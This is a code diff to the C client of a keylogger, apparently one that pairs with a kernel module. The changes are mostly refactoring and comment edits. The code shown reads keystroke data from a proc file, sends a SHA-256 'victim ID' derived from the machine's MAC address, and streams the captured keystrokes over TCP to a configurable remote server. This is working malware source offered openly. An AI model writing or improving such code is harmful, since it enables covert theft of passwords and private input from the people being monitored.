@@ -23,7 +23,7 @@
  */
 int get_mac_string(const char *ifname, char *mac_str, size_t mac_str_size)
 {
-    char path[SYSFS_PATH];
+    char path[SYSFS_PATH_LEN];
     // Construct the sysfs path using the provided interface name
     snprintf(path, sizeof(path), "/sys/class/net/%s/address", ifname);
 
@@ -58,21 +58,20 @@ int get_mac_string(const char *ifname, char *mac_str, size_t mac_str_size)
  * @brief Hashes a string using SHA-256 and formats it as hex
  * 
  * Computes the raw binary SHA-256 hash of the input string and 
- * converts each byte into a 2-character hexadecimal string.
+ * converts each byte into a 2 character hexadecimal string
  * 
  * @param input        The input string to be hashed (the MAC address)
  * @param out_hex      Buffer to store the result hex string
  * @param out_hex_size The size of the output buffer
  * @return 0 on success, -1 if the buffer is too small
  */
-// Hash a string with SHA-256 and return hex string.
-// Returns 0 on success, -1 on failure.
 int hash_string_sha256(const char *input, char *out_hex, size_t out_hex_size)
 {
-    // Allocate an array to store the raw 32-byte binary SHA-256 hash
+    // Allocate an array to store the raw 32 byte binary SHA-256 hash
     unsigned char hash[SHA256_DIGEST_LENGTH];
 
-    // Ensure the output buffer is large enough for 64 hex chars plus a null terminator
+    // Make sure the output buffer is large enough for 64 hex chars plus a null terminator
+    // 32 bytes of raw binary data × 2 hex characters per byte = 64 hex chars
     if (out_hex_size < (SHA256_DIGEST_LENGTH * 2 + 1))
     {
         return -1;
@@ -84,7 +83,7 @@ int hash_string_sha256(const char *input, char *out_hex, size_t out_hex_size)
     for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
     {
         // Converting raw binary data (hash) into a readable hexadecimal string.
-        // Format each byte as a 2-character(0x0A, 0x1B, 0xFF) hex string and append it
+        // Format each byte as a 2 character(0x0A, 0x1B, 0xFF) hex string and append it
         snprintf(out_hex + i * 2, 3, "%02X", hash[i]); // out_hex = 0A1BFF\0
     }
 
@@ -93,14 +92,25 @@ int hash_string_sha256(const char *input, char *out_hex, size_t out_hex_size)
     return 0;
 }
 
+/**
+ * @brief Main function of the keylogger client.
+ * 
+ * Parses command line arguments, establishes a TCP connection, 
+ * sends a unique hashed victim ID,
+ * and continuously streams keystroke data from the proc file to the server
+ * 
+ * @param argc Number of command line arguments
+ * @param argv Array of command line argument strings
+ * @return 0 on normal exit, 1 if socket creation or connection fails
+ */
 int main(int argc, char *argv[])
 {
     char buffer[BUF_SIZE]; // To store the text we get from kernel
     int fd; // Will hold the id number Linux gives us when we open the file
     int bytes_read; // How many bytes the kernel gave
 
-    char *target_ip = (char *)"127.0.0.1"; // Default ip
-    int target_port = 8080; // Default port
+    char *target_ip = DEFAULT_IP;
+    int target_port = DEFAULT_PORT;
 
     for (int i = 1; i < argc; i++)
     {
@@ -130,6 +140,7 @@ int main(int argc, char *argv[])
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(target_port);
 
+    // convert ip from text to binary
     if (inet_pton(AF_INET, target_ip, &serv_addr.sin_addr) <= 0)
     {
         perror("inet_pton");
@@ -145,7 +156,7 @@ int main(int argc, char *argv[])
     }
 
     // Build victim ID from MAC (sysfs) + SHA-256 and send it once
-    char mac_str[64];
+    char mac_str[MAC_SIZE];
     char victim_id[SHA256_DIGEST_LENGTH * 2 + 1]; // 64 hex chars + '\0'
 
     if (get_mac_string("enp0s8", mac_str, sizeof(mac_str)) == 0 && hash_string_sha256(mac_str, victim_id, sizeof(victim_id)) == 0)
@@ -157,7 +168,7 @@ int main(int argc, char *argv[])
     }
     else
     {
-        // Fallback ID if MAC or hash fails
+        // if MAC or hash fails
         send(sock, "ID:unknown\n", strlen("ID:unknown\n"), 0);
     }
     
@@ -183,7 +194,7 @@ int main(int argc, char *argv[])
 
         if (bytes_read > 0) // We got data
         {
-            send(sock, buffer, bytes_read, MSG_NOSIGNAL); // Send the raw bytes to the server
+            send(sock, buffer, bytes_read, 0); // Send the raw bytes to the server
         }
 
         close(fd);
